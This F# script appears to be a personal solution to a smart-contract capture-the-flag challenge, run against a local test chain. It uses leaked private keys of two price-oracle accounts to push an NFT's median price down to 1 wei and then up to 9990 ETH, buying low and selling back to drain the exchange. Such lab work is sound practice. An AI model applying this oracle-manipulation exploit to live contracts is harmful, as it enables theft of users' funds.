#i """nuget: C:\Users\jon_h\source\repos\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.3" 
#load "./Common.fsx"
#load "./Deployers/DeployLevel07.fsx"

open web3.fs
open Common
open DeployLevel07

// Scenario is that there are overpriced NFTs available at an 'exchange' contract.
// The contract allows buys and sells, based on retriving a median price from a set of
// oracles. The oracles use a function to set their price level for an NFT `postPrice()`
// Only certain EOAs can call this function. The website that hosts the exchange is
// leaking the private keys of two of the three oracle accounts.

// Goal: Drain the exchange of ETH using only .1 ETH

// My guess is that I need to do the following:
// Use compromised priv keys to set bad prices for the NFTs. - Done
// buy underpriced NFTs 
// Set the prices super high.
// Sell back to the exchange

let compromisedAccount81a5 = createWeb3Environment "127.0.0.1:1248" "2.0" "0x81a5d6e50c214044be44ca0cb057fe119097850c"
let compromisedAccountE924 = createWeb3Environment "127.0.0.1:1248" "2.0" "0xe92401a4d3af5e446d93d11eec806b1462b39d15"

callDevWith1 trustedOracle (ByString "getMedianPrice") [symbol] |> logIt
makeEthTxn compromisedAccount81a5 trustedOracle (ByString "postPrice") [symbol; Uint256 $"1"] ZEROV |> logIt
makeEthTxn compromisedAccountE924 trustedOracle (ByString "postPrice") [symbol; Uint256 $"1"] ZEROV |> logIt
callDevWith1 trustedOracle (ByString "getMedianPrice") [symbol] |> logIt

(*
[+] Call result:
Uint256 999000000000000000000

[+] Call result:
Uint256 1
*)

//txnDevWith2 exchange (ByString "buyOne") [] "1" |> logIt

makeEthTxn compromisedAccount81a5 trustedOracle (ByString "postPrice") [symbol; Uint256 $"""{(Ether "9990") |> asWei}"""] ZEROV |> logIt
makeEthTxn compromisedAccountE924 trustedOracle (ByString "postPrice") [symbol; Uint256 $"""{(Ether "9990") |> asWei}"""] ZEROV |> logIt

// I have to fetch the id of the token I bought...except there isn't really a way to do that. Have to examine the log from the transaction to get the ID of the token...

makeEthRPCCall devEnvironment2 GANACHE EthMethod.GetBalance ["0x33651c5492a5353e78d6ada9eb025c9dde18f4d2"; LATEST] |> logIt

// Approved sell in Remix so that I didn't have to add in bindings for the DVNFT token...
txnDevWith2 exchange (ByString "sellOne") [Uint256 "0"] ZEROV |> logIt

makeEthRPCCall devEnvironment2 GANACHE EthMethod.GetBalance ["0x33651c5492a5353e78d6ada9eb025c9dde18f4d2"; LATEST] |> logIt
